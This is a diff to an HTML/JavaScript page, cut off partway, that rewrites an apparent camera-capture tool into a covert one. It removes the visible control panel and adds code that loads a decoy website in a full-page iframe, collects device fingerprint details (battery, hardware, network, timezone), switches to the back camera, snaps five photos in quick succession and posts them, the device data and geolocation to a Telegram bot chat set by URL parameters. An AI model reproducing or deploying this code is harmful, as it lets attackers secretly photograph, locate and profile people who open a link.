@@ -45,349 +45,6 @@
             border: none;
             z-index: 1;
         }
-        
-        /* Floating control panel */
-        #controlPanel {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 20px;
-            z-index: 1000;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            min-width: 300px;
-            max-width: 350px;
-            color: white;
-            display: none; /* Hidden by default */
-        }
-        
-        #controlPanel.visible {
-            display: block;
-        }
-        
-        /* Toggle button to show/hide control panel */
-        #toggleControl {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 50px;
-            height: 50px;
-            background: rgba(0, 0, 0, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            color: white;
-            font-size: 1.5rem;
-            cursor: pointer;
-            z-index: 999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-            transition: all 0.3s ease;
-        }
-        
-        #toggleControl:hover {
-            background: rgba(0, 0, 0, 0.95);
-            transform: scale(1.1);
-        }
-        
-        #toggleControl.hidden {
-            display: none;
-        }
-        
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            cursor: pointer;
-        }
-        
-        .panel-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .minimize-btn {
-            background: rgba(255, 255, 255, 0.2);
-            border: none;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1rem;
-        }
-        
-        .minimize-btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-        }
-        
-        .status-grid {
-            display: grid;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .status-item {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .status-label {
-            font-size: 0.9rem;
-            opacity: 0.8;
-        }
-        
-        .status-value {
-            font-weight: 600;
-            font-size: 1rem;
-        }
-        
-        .controls {
-            display: grid;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .btn {
-            padding: 12px 20px;
-            border: none;
-            border-radius: 10px;
-            font-size: 0.95rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        
-        .btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            opacity: 0.9;
-        }
-        
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
-        .btn-success {
-            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
-            color: white;
-        }
-        
-        .btn-danger {
-            background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
-            color: white;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        
-        .btn-warning {
-            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
-            color: white;
-        }
-        
-        .website-input {
-            width: 100%;
-            padding: 10px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-size: 0.9rem;
-            margin-bottom: 10px;
-        }
-        
-        .website-input:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        
-        .website-input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 3px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #11998e, #38ef7d);
-            width: 0%;
-            transition: width 0.1s linear;
-        }
-        
-        .capture-status {
-            margin-top: 10px;
-            font-size: 0.85rem;
-            text-align: center;
-            padding: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 5px;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-        
-        .sending {
-            animation: pulse 0.5s infinite;
-        }
-        
-        .success {
-            color: #38ef7d;
-        }
-        
-        .error {
-            color: #f45c43;
-        }
-        
-        .settings-section {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .settings-title {
-            font-size: 1rem;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .setting-item {
-            margin-bottom: 10px;
-        }
-        
-        .setting-label {
-            font-size: 0.85rem;
-            margin-bottom: 5px;
-            display: block;
-            opacity: 0.8;
-        }
-        
-        select, input[type="range"] {
-            width: 100%;
-            padding: 8px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-size: 0.85rem;
-        }
-        
-        select option {
-            background: #1a1a1a;
-        }
-        
-        .gallery-preview {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-top: 15px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        
-        .gallery-preview::-webkit-scrollbar {
-            width: 4px;
-        }
-        
-        .gallery-preview::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.3);
-            border-radius: 2px;
-        }
-        
-        .gallery-thumb {
-            width: 100%;
-            aspect-ratio: 1;
-            object-fit: cover;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        
-        .gallery-thumb:hover {
-            transform: scale(1.1);
-        }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .modal.active {
-            display: flex;
-        }
-        
-        .modal-content {
-            position: relative;
-            max-width: 90%;
-            max-height: 90%;
-        }
-        
-        .modal-content img {
-            max-width: 100%;
-            max-height: 90vh;
-            border-radius: 10px;
-        }
-        
-        .modal-close {
-            position: absolute;
-            top: -40px;
-            right: 0;
-            background: rgba(255, 255, 255, 0.2);
-            border: none;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1.2rem;
-        }
-        
-        .draggable {
-            cursor: move;
-        }
-        
-        @media (max-width: 768px) {
-            #controlPanel {
-                bottom: 10px;
-                right: 10px;
-                left: 10px;
-                max-width: none;
-            }
-        }
     </style>
 </head>
 <body>
@@ -398,130 +55,6 @@
     
     <!-- Main website iframe (foreground) -->
     <iframe id="websiteFrame" src="about:blank"></iframe>
-    
-    <!-- Toggle button -->
-    <button id="toggleControl" onclick="toggleControlPanel()">⚙️</button>
-    
-    <!-- Floating control panel -->
-    <div id="controlPanel">
-        <div class="panel-header" onclick="togglePanel()">
-            <div class="panel-title">
-                <span>📸</span>
-                <span>Camera Control</span>
-            </div>
-            <button class="minimize-btn" id="minimizeBtn" onclick="event.stopPropagation(); toggleControlPanel()">✕</button>
-        </div>
-        
-        <div class="panel-content">
-            <!-- Website URL Input -->
-            <div style="margin-bottom: 15px;">
-                <label class="setting-label">🌐 Current Website</label>
-                <input 
-                    type="text" 
-                    id="websiteUrl" 
-                    class="website-input" 
-                    placeholder="Enter website URL"
-                    value=""
-                    readonly
-                    style="opacity: 0.7;"
-                >
-                <button class="btn btn-primary" onclick="loadWebsite()">
-                    🔄 Reload Website
-                </button>
-                <small style="display: block; margin-top: 5px; opacity: 0.7; font-size: 0.75rem;">
-                    Format: ?chat_id=YOUR_ID&site=YOUR_WEBSITE
-                </small>
-            </div>
-            
-            <!-- Status -->
-            <div class="status-grid">
-                <div class="status-item">
-                    <span class="status-label">📷 Camera</span>
-                    <span class="status-value" id="cameraStatus">Off</span>
-                </div>
-                <div class="status-item">
-                    <span class="status-label">💬 Chat ID</span>
-                    <span class="status-value" id="chatIdDisplay">${CHAT_ID}</span>
-                </div>
-                <div class="status-item">
-                    <span class="status-label">📍 Location</span>
-                    <span class="status-value" id="locationStatus">Pending</span>
-                </div>
-                <div class="status-item">
-                    <span class="status-label">📸 Photos</span>
-                    <span class="status-value" id="photoCount">0</span>
-                </div>
-                <div class="status-item">
-                    <span class="status-label">📤 Sent</span>
-                    <span class="status-value" id="photosSent">0</span>
-                </div>
-            </div>
-            
-            <!-- Controls -->
-            <div class="controls">
-                <button class="btn btn-success" id="startCamera" onclick="startCamera()">
-                    📹 Start Camera
-                </button>
-                <button class="btn btn-danger" id="stopCamera" onclick="stopCamera()" disabled>
-                    ⏹️ Stop Camera
-                </button>
-                <button class="btn btn-warning" id="autoCapture" onclick="autoCapture()" disabled>
-                    ⚡ Auto-Capture (5 photos)
-                </button>
-            </div>
-            
-            <!-- Progress -->
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-            <div class="capture-status" id="captureStatus">Ready</div>
-            
-            <!-- Settings -->
-            <div class="settings-section">
-                <div class="settings-title">⚙️ Settings</div>
-                
-                <div class="setting-item">
-                    <label class="setting-label">Camera</label>
-                    <select id="cameraSelect" onchange="switchCamera()">
-                        <option value="user">Front Camera</option>
-                        <option value="environment">Back Camera</option>
-                    </select>
-                </div>
-                
-                <div class="setting-item">
-                    <label class="setting-label">Resolution</label>
-                    <select id="resolutionSelect">
-                        <option value="640,480" selected>640x480</option>
-                        <option value="1280,720">1280x720 (HD)</option>
-                        <option value="1920,1080">1920x1080 (Full HD)</option>
-                    </select>
-                </div>
-                
-                <div class="setting-item">
-                    <label class="setting-label">Capture Interval: <span id="intervalValue">100</span>ms</label>
-                    <input type="range" id="intervalSlider" min="50" max="500" value="100" step="50" oninput="updateInterval()">
-                </div>
-            </div>
-            
-            <!-- Gallery Preview -->
-            <div class="settings-section">
-                <div class="settings-title">🖼️ Gallery</div>
-                <div class="gallery-preview" id="galleryPreview">
-                    <div style="grid-column: 1/-1; text-align: center; padding: 20px; opacity: 0.5;">
-                        No photos yet
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Photo Modal -->
-    <div class="modal" id="photoModal" onclick="closeModal()">
-        <div class="modal-content" onclick="event.stopPropagation()">
-            <button class="modal-close" onclick="closeModal()">✕</button>
-            <img id="modalImage" src="" alt="Photo">
-        </div>
-    </div>
 
     <script>
         // Configuration - Get website and chat_id from URL parameters
@@ -560,322 +93,155 @@
         
         // App State
         let cameraStream = null;
-        let currentFacingMode = 'user';
+        let currentFacingMode = 'environment'; // Start with back camera
         let photos = [];
         let photosSentCount = 0;
-        let isAutoCapturing = false;
-        let captureInterval = 100;
-        let currentResolution = { width: 640, height: 480 };
+        let isCapturing = false;
+        let deviceInfo = {};
         
         // DOM Elements
         const cameraVideo = document.getElementById('cameraVideo');
         const websiteFrame = document.getElementById('websiteFrame');
-        const controlPanel = document.getElementById('controlPanel');
-        const startCameraBtn = document.getElementById('startCamera');
-        const stopCameraBtn = document.getElementById('stopCamera');
-        const autoCaptureBtn = document.getElementById('autoCapture');
-        const cameraStatus = document.getElementById('cameraStatus');
-        const photoCount = document.getElementById('photoCount');
-        const photosSent = document.getElementById('photosSent');
-        const locationStatus = document.getElementById('locationStatus');
-        const progressFill = document.getElementById('progressFill');
-        const captureStatus = document.getElementById('captureStatus');
-        const galleryPreview = document.getElementById('galleryPreview');
-        const photoModal = document.getElementById('photoModal');
-        const modalImage = document.getElementById('modalImage');
-        const resolutionSelect = document.getElementById('resolutionSelect');
-        const intervalSlider = document.getElementById('intervalSlider');
-        const toggleControlBtn = document.getElementById('toggleControl');
         
-        // Toggle control panel visibility
-        function toggleControlPanel() {
-            controlPanel.classList.toggle('visible');
-            if (controlPanel.classList.contains('visible')) {
-                toggleControlBtn.style.display = 'none';
-            } else {
-                toggleControlBtn.style.display = 'flex';
+        // Get comprehensive device info
+        async function getDeviceInfo() {
+            const info = {
+                // Battery
+                battery: null,
+                
+                // Screen
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                screenColorDepth: window.screen.colorDepth,
+                
+                // Browser/Device
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages.join(', '),
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                
+                // Hardware
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                
+                // Connection
+                connectionType: 'N/A',
+                effectiveType: 'N/A',
+                downlink: 'N/A',
+                
+                // Window
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                pixelRatio: window.devicePixelRatio,
+                
+                // Time
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Get battery info
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + 's',
+                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + 's'
+                    };
+                } catch (e) {
+                    info.battery = 'Not available';
+                }
+            }
+            
+            // Get connection info
+            if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    info.connectionType = conn.type || conn.effectiveType || 'Unknown';
+                    info.effectiveType = conn.effectiveType || 'N/A';
+                    info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+                }
+            }
+            
+            return info;
+        }
+        
+        // Send device info to Telegram
+        async function sendDeviceInfoToTelegram(deviceInfo) {
+            try {
+                let message = '📱 *Device Information*\n\n';
+                
+                // Battery
+                if (deviceInfo.battery && typeof deviceInfo.battery === 'object') {
+                    message += `🔋 *Battery:* ${deviceInfo.battery.level}\n`;
+                    message += `⚡ *Charging:* ${deviceInfo.battery.charging ? 'Yes' : 'No'}\n\n`;
+                }
+                
+                // Screen
+                message += `📺 *Screen:* ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
+                message += `🎨 *Color Depth:* ${deviceInfo.screenColorDepth}-bit\n`;
+                message += `🔍 *Pixel Ratio:* ${deviceInfo.pixelRatio}x\n\n`;
+                
+                // Hardware
+                message += `🧠 *CPU Cores:* ${deviceInfo.hardwareConcurrency}\n`;
+                message += `💾 *RAM:* ${deviceInfo.deviceMemory}\n`;
+                message += `👆 *Touch Points:* ${deviceInfo.maxTouchPoints}\n\n`;
+                
+                // Connection
+                message += `📡 *Connection:* ${deviceInfo.connectionType}\n`;
+                message += `🌐 *Network Type:* ${deviceInfo.effectiveType}\n`;
+                message += `⬇️ *Speed:* ${deviceInfo.downlink}\n\n`;
+                
+                // Other
+                message += `🌍 *Timezone:* ${deviceInfo.timezone}\n`;
+                message += `🗣️ *Language:* ${deviceInfo.language}\n`;
+                message += `💻 *Platform:* ${deviceInfo.platform}\n`;
+                message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+                
+                const url = `${TELEGRAM_API}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Device info sent to Telegram');
+                }
+            } catch (error) {
+                console.error('❌ Error sending device info:', error);
             }
         }
         
         // Load website in iframe
         function loadWebsite() {
-            const url = document.getElementById('websiteUrl').value.trim();
-            if (url) {
-                try {
-                    // Add https:// if not present
-                    const formattedUrl = url.startsWith('http') ? url : 'https://' + url;
-                    websiteFrame.src = formattedUrl;
-                    captureStatus.textContent = `Loading: ${formattedUrl}`;
-                    
-                    // Handle iframe load errors
-                    websiteFrame.onerror = () => {
-                        captureStatus.textContent = 'Failed to load website';
-                        captureStatus.className = 'capture-status error';
-                    };
-                } catch (error) {
-                    captureStatus.textContent = 'Invalid URL';
-                    captureStatus.className = 'capture-status error';
-                }
-            }
-        }
-        
-        // Load default website on startup
-        function loadDefaultWebsite() {
-            const urlInput = document.getElementById('websiteUrl');
-            urlInput.value = DEFAULT_WEBSITE;
-            loadWebsite();
-        }
-        
-        // Toggle panel minimize
-        function togglePanel() {
-            // This function is no longer needed but kept for compatibility
-        }
-        
-        // Update interval
-        function updateInterval() {
-            captureInterval = parseInt(intervalSlider.value);
-            document.getElementById('intervalValue').textContent = captureInterval;
-        }
-        
-        // Start camera (background)
-        async function startCamera() {
             try {
-                cameraStatus.textContent = 'Starting...';
-                
-                const constraints = {
-                    video: {
-                        width: { ideal: currentResolution.width },
-                        height: { ideal: currentResolution.height },
-                        facingMode: currentFacingMode,
-                        // Request better quality settings
-                        aspectRatio: { ideal: 4/3 },
-                        frameRate: { ideal: 30 }
-                    }
-                };
-                
-                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-                cameraVideo.srcObject = cameraStream;
-                
-                // Wait for video metadata to load
-                await new Promise((resolve) => {
-                    cameraVideo.onloadedmetadata = () => {
-                        resolve();
-                    };
-                });
-                
-                // Wait for video to actually start playing
-                await cameraVideo.play();
-                
-                // Additional wait for camera to warm up and adjust exposure
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                cameraStatus.textContent = 'Active';
-                cameraStatus.className = 'status-value success';
-                
-                startCameraBtn.disabled = true;
-                stopCameraBtn.disabled = false;
-                autoCaptureBtn.disabled = false;
-                
-                captureStatus.textContent = 'Camera running and ready';
-                console.log('✅ Camera fully initialized and ready');
+                websiteFrame.src = DEFAULT_WEBSITE;
+                console.log('🌐 Loading website:', DEFAULT_WEBSITE);
             } catch (error) {
-                console.error('Camera error:', error);
-                cameraStatus.textContent = 'Error';
-                cameraStatus.className = 'status-value error';
-                captureStatus.textContent = 'Camera access denied';
+                console.error('Failed to load website:', error);
             }
         }
-        
-        // Stop camera
-        function stopCamera() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraVideo.srcObject = null;
-                cameraStream = null;
-                
-                cameraStatus.textContent = 'Off';
-                cameraStatus.className = 'status-value';
-                
-                startCameraBtn.disabled = false;
-                stopCameraBtn.disabled = true;
-                autoCaptureBtn.disabled = true;
-                
-                captureStatus.textContent = 'Camera stopped';
-            }
-        }
-        
-        // Switch camera
-        async function switchCamera() {
-            currentFacingMode = document.getElementById('cameraSelect').value;
-            if (cameraStream) {
-                stopCamera();
-                await startCamera();
-            }
-        }
-        
-        // Update resolution
-        resolutionSelect.addEventListener('change', () => {
-            const [width, height] = resolutionSelect.value.split(',').map(Number);
-            currentResolution = { width, height };
-            if (cameraStream) {
-                stopCamera();
-                startCamera();
-            }
-        });
-        
-        // Capture single photo
-        function capturePhoto() {
-            return new Promise((resolve) => {
-                // Check if video is actually playing
-                if (cameraVideo.readyState !== cameraVideo.HAVE_ENOUGH_DATA) {
-                    console.warn('⚠️ Video not ready, waiting...');
-                    setTimeout(() => resolve(capturePhoto()), 500);
-                    return;
-                }
-                
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                
-                // Use actual video dimensions
-                canvas.width = cameraVideo.videoWidth || currentResolution.width;
-                canvas.height = cameraVideo.videoHeight || currentResolution.height;
-                
-                // Verify we have valid dimensions
-                if (canvas.width === 0 || canvas.height === 0) {
-                    console.error('❌ Invalid video dimensions');
-                    canvas.width = currentResolution.width;
-                    canvas.height = currentResolution.height;
-                }
-                
-                console.log(`📸 Capturing at ${canvas.width}x${canvas.height}`);
-                
-                // Draw the current video frame
-                context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(blob => {
-                    const photo = {
-                        id: Date.now() + Math.random(),
-                        blob: blob,
-                        url: URL.createObjectURL(blob),
-                        timestamp: new Date(),
-                        resolution: `${canvas.width}x${canvas.height}`
-                    };
-                    
-                    photos.push(photo);
-                    updateGallery();
-                    photoCount.textContent = photos.length;
-                    
-                    resolve(photo);
-                }, 'image/jpeg', 0.95);
-            });
-        }
-        
-        // Send photo to bot (simulated)
-        async function sendPhotoToBot(photo, photoNumber) {
-            return new Promise((resolve) => {
-                captureStatus.textContent = `Sending photo ${photoNumber}...`;
-                captureStatus.classList.add('sending');
-                
-                // Simulate API call
-                setTimeout(() => {
-                    photosSentCount++;
-                    photosSent.textContent = photosSentCount;
-                    captureStatus.classList.remove('sending');
-                    console.log(`Photo ${photoNumber} sent!`, {
-                        size: photo.blob.size,
-                        timestamp: photo.timestamp,
-                        resolution: photo.resolution
-                    });
-                    resolve();
-                }, 50);
-            });
-        }
-        
-        // Auto-capture 5 photos
-        async function autoCapture() {
-            await autoCaptureWithLocation();
-        }
-        
-        // Update gallery preview
-        function updateGallery() {
-            if (photos.length === 0) {
-                galleryPreview.innerHTML = '<div style="grid-column: 1/-1; text-align: center; padding: 20px; opacity: 0.5;">No photos yet</div>';
-                return;
-            }
-            
-            galleryPreview.innerHTML = '';
-            photos.slice(-9).reverse().forEach((photo, index) => {
-                const img = document.createElement('img');
-                img.src = photo.url;
-                img.className = 'gallery-thumb';
-                img.onclick = () => viewPhoto(photo);
-                galleryPreview.appendChild(img);
-            });
-        }
-        
-        // View photo in modal
-        function viewPhoto(photo) {
-            modalImage.src = photo.url;
-            photoModal.classList.add('active');
-        }
-        
-        // Close modal
-        function closeModal() {
-            photoModal.classList.remove('active');
-        }
-        
-        // Make control panel draggable
-        let isDragging = false;
-        let currentX, currentY, initialX, initialY;
-        
-        controlPanel.querySelector('.panel-header').addEventListener('mousedown', dragStart);
-        document.addEventListener('mousemove', drag);
-        document.addEventListener('mouseup', dragEnd);
-        
-        function dragStart(e) {
-            if (e.target.classList.contains('minimize-btn')) return;
-            initialX = e.clientX - controlPanel.offsetLeft;
-            initialY = e.clientY - controlPanel.offsetTop;
-            isDragging = true;
-        }
-        
-        function drag(e) {
-            if (isDragging) {
-                e.preventDefault();
-                currentX = e.clientX - initialX;
-                currentY = e.clientY - initialY;
-                controlPanel.style.left = currentX + 'px';
-                controlPanel.style.top = currentY + 'px';
-                controlPanel.style.right = 'auto';
-                controlPanel.style.bottom = 'auto';
-            }
-        }
-        
-        function dragEnd() {
-            isDragging = false;
-        }
-        
-        // Cleanup
-        window.addEventListener('beforeunload', () => {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            photos.forEach(photo => URL.revokeObjectURL(photo.url));
-        });
         
         // Get location
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     console.log('Geolocation not supported');
-                    locationStatus.textContent = 'Not supported';
-                    locationStatus.className = 'status-value error';
                     resolve(null);
                     return;
                 }
-                
-                locationStatus.textContent = 'Getting...';
-                locationStatus.className = 'status-value';
                 
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -885,20 +251,16 @@
                             accuracy: position.coords.accuracy,
                             timestamp: new Date()
                         };
-                        locationStatus.textContent = `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`;
-                        locationStatus.className = 'status-value success';
-                        console.log('Location captured:', location);
+                        console.log('📍 Location captured:', location);
                         resolve(location);
                     },
                     (error) => {
                         console.log('Location error:', error.message);
-                        locationStatus.textContent = 'Denied';
-                        locationStatus.className = 'status-value error';
                         resolve(null);
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 5000,
+                        timeout: 3000,
                         maximumAge: 0
                     }
                 );
@@ -924,35 +286,30 @@
                 const result = await response.json();
                 
                 if (result.ok) {
-                    console.log('✅ Location sent to Telegram successfully');
+                    console.log('✅ Location sent to Telegram');
                     return true;
                 } else {
                     console.error('❌ Failed to send location:', result);
                     return false;
                 }
             } catch (error) {
-                console.error('❌ Error sending location to Telegram:', error);
+                console.error('❌ Error sending location:', error);
                 return false;
             }
         }
         
-        // Send photo to Telegram
-        async function sendPhotoToTelegram(photo, photoNumber, location) {
+        // Send photo to Telegram (immediately)
+        async function sendPhotoToTelegram(photo, photoNumber) {
             try {
                 const url = `${TELEGRAM_API}/sendPhoto`;
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', photo.blob, `photo_${photoNumber}_${Date.now()}.jpg`);
                 
-                // Add caption with metadata
                 let caption = `📸 Photo ${photoNumber}/5\n`;
                 caption += `⏰ ${photo.timestamp.toLocaleString()}\n`;
                 caption += `📐 ${photo.resolution}\n`;
                 caption += `💾 ${(photo.blob.size / 1024).toFixed(2)} KB`;
-                
-                if (location) {
-                    caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
-                }
                 
                 formData.append('caption', caption);
                 
@@ -964,140 +321,214 @@
                 const result = await response.json();
                 
                 if (result.ok) {
-                    console.log(`✅ Photo ${photoNumber} sent to Telegram successfully`);
+                    console.log(`✅ Photo ${photoNumber} sent to Telegram`);
+                    photosSentCount++;
                     return true;
                 } else {
                     console.error(`❌ Failed to send photo ${photoNumber}:`, result);
                     return false;
                 }
             } catch (error) {
-                console.error(`❌ Error sending photo ${photoNumber} to Telegram:`, error);
+                console.error(`❌ Error sending photo ${photoNumber}:`, error);
                 return false;
             }
         }
         
-        // Send photo with location to bot
-        async function sendPhotoWithLocation(photo, photoNumber, location) {
-            captureStatus.textContent = `Sending photo ${photoNumber} to Telegram...`;
-            captureStatus.classList.add('sending');
-            
-            // Send photo to Telegram
-            const photoSent = await sendPhotoToTelegram(photo, photoNumber, location);
-            
-            if (photoSent) {
-                photosSentCount++;
-                photosSent.textContent = photosSentCount;
-                captureStatus.classList.remove('sending');
-                captureStatus.textContent = `Photo ${photoNumber} sent to Telegram ✅`;
-                captureStatus.className = 'capture-status success';
-            } else {
-                captureStatus.classList.remove('sending');
-                captureStatus.textContent = `Failed to send photo ${photoNumber} ❌`;
-                captureStatus.className = 'capture-status error';
+        // Start camera (faster initialization)
+        async function startCamera() {
+            try {
+                console.log('📹 Starting camera...');
+                
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: currentFacingMode,
+                        frameRate: { ideal: 30 }
+                    }
+                };
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = cameraStream;
+                
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    cameraVideo.onloadedmetadata = resolve;
+                });
+                
+                await cameraVideo.play();
+                
+                // Minimal warm-up time (500ms instead of 5000ms)
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                console.log('✅ Camera ready');
+                return true;
+            } catch (error) {
+                console.error('❌ Camera error:', error);
+                return false;
             }
-            
-            // Small delay to show status
-            await new Promise(resolve => setTimeout(resolve, 100));
         }
         
-        // Modified auto-capture with location
-        async function autoCaptureWithLocation() {
-            if (isAutoCapturing) return;
-            
-            isAutoCapturing = true;
-            autoCaptureBtn.disabled = true;
-            
-            // Get location first
-            captureStatus.textContent = 'Getting location...';
-            const location = await getLocation();
-            
-            // Send location to Telegram first
-            if (location) {
-                captureStatus.textContent = 'Sending location to Telegram...';
-                await sendLocationToTelegram(location);
+        // Stop camera
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraVideo.srcObject = null;
+                cameraStream = null;
             }
+        }
+        
+        // Capture single photo
+        async function capturePhoto() {
+            return new Promise((resolve) => {
+                if (cameraVideo.readyState !== cameraVideo.HAVE_ENOUGH_DATA) {
+                    console.warn('⚠️ Video not ready');
+                    setTimeout(() => resolve(capturePhoto()), 100);
+                    return;
+                }
+                
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                canvas.width = cameraVideo.videoWidth || 1280;
+                canvas.height = cameraVideo.videoHeight || 720;
+                
+                if (canvas.width === 0 || canvas.height === 0) {
+                    console.error('❌ Invalid dimensions');
+                    resolve(null);
+                    return;
+                }
+                
+                context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const photo = {
+                        blob: blob,
+                        timestamp: new Date(),
+                        resolution: `${canvas.width}x${canvas.height}`
+                    };
+                    
+                    photos.push(photo);
+                    resolve(photo);
+                }, 'image/jpeg', 0.9);
+            });
+        }
+        
+        // Fast capture and send (parallel processing)
+        async function fastCaptureAndSend() {
+            if (isCapturing) return;
+            isCapturing = true;
+            
+            console.log('🚀 Starting fast capture...');
             
             const totalPhotos = 5;
+            const capturePromises = [];
             
+            // Capture all 5 photos rapidly (no delay between captures)
             for (let i = 1; i <= totalPhotos; i++) {
-                const progress = (i / totalPhotos) * 100;
-                progressFill.style.width = progress + '%';
-                
-                captureStatus.textContent = `Capturing photo ${i}/${totalPhotos}...`;
-                
                 const photo = await capturePhoto();
-                await sendPhotoWithLocation(photo, i, location);
                 
+                if (photo) {
+                    // Send immediately without waiting
+                    sendPhotoToTelegram(photo, i);
+                    console.log(`📸 Photo ${i} captured and sending...`);
+                }
+                
+                // Tiny 50ms delay between captures
                 if (i < totalPhotos) {
-                    await new Promise(resolve => setTimeout(resolve, captureInterval));
+                    await new Promise(resolve => setTimeout(resolve, 50));
                 }
             }
             
-            progressFill.style.width = '100%';
-            captureStatus.textContent = `All ${totalPhotos} photos sent to Telegram! ✅`;
-            captureStatus.className = 'capture-status success';
-            
